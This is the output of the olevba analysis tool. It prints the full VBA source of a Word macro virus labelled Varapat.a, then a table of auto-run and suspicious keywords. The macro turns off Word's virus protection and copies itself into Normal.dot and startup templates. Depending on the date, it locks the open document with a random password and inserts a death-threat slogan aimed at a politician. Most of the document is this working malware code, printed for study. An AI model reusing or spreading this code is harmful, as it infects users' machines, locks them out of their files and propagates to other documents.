olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Varapat.a-382f6ad244e0869fd6c14a687d33187456671913
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Varapat.a-382f6ad244e0869fd6c14a687d33187456671913 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Reproduct.bas 
in file: Virus.MSWord.Varapat.a-382f6ad244e0869fd6c14a687d33187456671913 - OLE stream: 'Macros/VBA/Reproduct'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Repro
tyoi = Year(Date)
fdar = Day(Date)
grij = Minute(Time)
Dim treb
Randomize
treb = Int((25 * Rnd) + 1)
puuc = tyoi * grij * fdar * treb
If Day(Date) > 17 Then ActiveDocument.Password = (puuc)
If Day(Date) > 16 Then ActiveDocument.Content.InsertAfter Text:=" L. D. Kuchma must die. Best regards, Pativara. "
End Sub
Sub Pativara()
MsgBox "KUCHMA MUST DIE !"
If Day(Date) > 18 Then AutoClose
End Sub
Sub AutoClose()
If Day(Date) > 18 Then MsgBox "ANTI-SEKRETUTKA by Pativara"
If Day(Date) > 17 Then Pativara
End Sub
Sub Repro()
Application.Options.VirusProtection = False
On Error Resume Next
turs = Doc.Text.KillFiles
murt = Word.Application.Path + "\XLSTART\xlsmurt.drv"
biht = Glob.Matters.Appl + "C:\Windows"
murt = Word.Application.Path + "\STARTUP\winword.drv"
nart = Wording.Jump.Image1033.jpg
etun = Word.ActiveDocument.FullName
mute = Deltree.Format - C.Delete
srun = NormalData.Base.FullName
kapy = Normal.ThisDocument.FullName
kapu = Glob.ThisDocument.FullNam
hibr = "Reproduct"
tyja = "Regedit"
bers = "Reparation"
trir = "Repatriation"
hjbr = Add.Custom.Macro.FullName
If (Dir(murt) = "") Then
Application.Documents.Add
Application.Documents(1).SaveAs (murt)
Application.Documents(1).Close SaveChanges:=False
Word.RecentFiles.Item(1).Delete
End If
Application.OrganizerCopy Source:=etun, _
Destination:=murt, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=etun, _
Destination:=kapy, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=kapy, _
Destination:=murt, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=murt, _
Destination:=etun, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoExit()
AutoClose
End Sub
Sub ToolsMacro()
' Macro.Word.PATIVARA '
End Sub
Sub ViewSecurity()
' by Pativara B.-A. V., 2005 '
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

